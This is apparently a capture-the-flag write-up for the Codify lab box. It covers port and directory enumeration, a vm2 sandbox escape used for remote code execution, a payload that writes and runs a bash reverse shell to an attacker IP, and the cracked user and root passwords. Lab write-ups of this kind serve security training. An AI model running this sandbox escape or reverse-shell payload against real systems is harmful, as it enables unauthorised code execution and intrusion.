## Box: Codify

> damiano gubiani

```bash
export IP=10.10.11.239
```


# Enumerating

> nmap

```bash
# Nmap 7.95 scan initiated Sat Apr 19 09:37:48 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -oN nmap/fst -vv 10.10.11.239
Nmap scan report for 10.10.11.239 (10.10.11.239)
Host is up, received echo-reply ttl 63 (0.043s latency).
Scanned at 2025-04-19 09:37:48 EDT for 15s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Codify
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 19 09:38:03 2025 -- 1 IP address (1 host up) scanned in 14.72 seconds
```

> gobuster

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://codify.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              cgi,php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2921]
/About                (Status: 200) [Size: 2921]
/editor               (Status: 200) [Size: 3123]
/Editor               (Status: 200) [Size: 3123]
/ABOUT                (Status: 200) [Size: 2921]
/limitations          (Status: 200) [Size: 2665]
/server-status        (Status: 403) [Size: 275]
Progress: 560416 / 1102805 (50.82%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 560871 / 1102805 (50.86%)
===============================================================                                                                                                                                                       
Finished                                                                                                                                                                                                              
===============================================================   
```

# WebApp

> /limitations

*Restristed*
- child_process
- fs

*allowed*
- url
- crypto
- util
- events
- assert
- stream
- path
- os
- zlib


# Sandbox Escape vm2

> PoC used for RCE

```javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo pwned").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

got some issue to get a reverse shell , so i uploaded a shell.sh with this payload

```bash
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo '/bin/bash -i >& /dev/tcp/10.10.16.18/8888 0>&1' > shell.sh").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); 
```

then run the script with

```bash
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("bash shell.sh").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); 
```


# Lateral movement

found hash of joshua user

> $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1


# PrivEsc

using pspy64 we get root credentials using

> pspy64

root:kljh12k3jhaskjh12kjh3



